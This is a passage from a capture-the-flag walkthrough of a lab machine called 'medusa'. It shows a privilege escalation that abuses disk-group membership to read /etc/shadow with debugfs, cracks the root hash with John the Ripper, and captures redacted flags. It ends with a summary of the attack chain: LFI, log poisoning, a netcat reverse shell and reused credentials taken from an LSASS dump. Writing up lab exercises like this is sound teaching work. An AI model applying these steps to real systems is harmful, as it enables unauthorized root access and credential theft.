Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 21 14:57:30 2023 from 192.168.1.13
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

The credentials worked successfully, granting access as the spectre user. The user was a member of several groups, including the disk group, which presented a significant privilege escalation opportunity.

---

## Privilege Escalation to Root

### Disk Group Exploitation

The disk group membership allows reading raw disk devices, which can be leveraged to read any file on the filesystem, including protected files like /etc/shadow.

```bash
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            471M     0  471M   0% /dev
tmpfs            98M  512K   98M   1% /run
/dev/sda1       6.9G  1.8G  4.8G  28% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000
spectre@medusa:~$ debugfs /dev/sda1
-bash: debugfs: command not found
spectre@medusa:~$ /sbin/debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /etc/shadow
root:$y$[REDACTED]:0:99999:7:::
daemon:*:19372:0:99999:7:::
bin:*:19372:0:99999:7:::
sys:*:19372:0:99999:7:::
sync:*:19372:0:99999:7:::
games:*:19372:0:99999:7:::
man:*:19372:0:99999:7:::
lp:*:19372:0:99999:7:::
mail:*:19372:0:99999:7:::
news:*:19372:0:99999:7:::
uucp:*:19372:0:99999:7:::
proxy:*:19372:0:99999:7:::
www-data:*:19372:0:99999:7:::
backup:*:19372:0:99999:7:::
list:*:19372:0:99999:7:::
irc:*:19372:0:99999:7:::
gnats:*:19372:0:99999:7:::
nobody:*:19372:0:99999:7:::
_apt:*:19372:0:99999:7:::
systemd-network:*:19372:0:99999:7:::
systemd-resolve:*:19372:0:99999:7:::
messagebus:*:19372:0:99999:7:::
systemd-timesync:*:19372:0:99999:7:::
sshd:*:19372:0:99999:7:::
spectre:$y$[REDACTED]:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
```

Using debugfs, I successfully extracted the root password hash from /etc/shadow. I transferred this hash to my attacking machine for offline cracking.

### Root Password Cracking

I saved the root hash and used John the Ripper to crack it.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ echo 'root:$y$[REDACTED]:0:99999:7:::' > hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```

The initial attempt failed because John did not recognize the hash format. I specified the crypt format explicitly.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:42 0.02% (ETA: 2026-04-07 10:32) 0g/s 65.30p/s 65.30c/s 65.30C/s meagan..soccer9
and[REDACTED]        (root)
1g 0:00:01:03 DONE (2026-04-04 10:19) 0.01586g/s 59.39p/s 59.39c/s 59.39C/s 19871987..street
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The root password was successfully cracked. I used these credentials to switch to the root user.

### Root Access

```bash
spectre@medusa:~$ su - root
Password:
root@medusa:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
medusa
root@medusa:~# cat /home/spectre/user.txt /root/.rO0t.txt
good job!

487[REDACTED]
congrats hacker :)

34b[REDACTED]
```

Full root access was achieved, and both the user and root flags were successfully captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning revealed a Debian Linux system running FTP, SSH, and Apache web services. Directory enumeration discovered the /hades endpoint, which contained a page requiring a "magic word" that led to the discovery of the medusa.hmv domain.

2. **Vulnerability Discovery**: Virtual host fuzzing revealed a development subdomain (dev.medusa.hmv) hosting a vulnerable PHP application. Parameter fuzzing identified a Local File Inclusion vulnerability in the system.php file using the "view" parameter.

3. **Exploitation**: The LFI vulnerability was escalated to Remote Code Execution through log poisoning. By injecting PHP code into the vsFTPd log file via a malicious FTP username and then including the poisoned log file through the LFI, arbitrary command execution was achieved. A reverse shell was established using busybox netcat.

4. **Internal Enumeration**: As www-data, filesystem enumeration revealed a hidden directory in the root filesystem containing a password-protected ZIP archive. The archive was cracked using John the Ripper, revealing an LSASS memory dump from a Windows system. Analysis of the dump using pypykatz exposed cleartext credentials for the spectre user, which were successfully reused for SSH access.

5. **Privilege Escalation**: The spectre user was a member of the disk group, which provided the ability to read raw disk devices. Using debugfs to access the /dev/sda1 block device, the /etc/shadow file was extracted, and the root password hash was cracked offline. The cracked password granted full root access to the system.

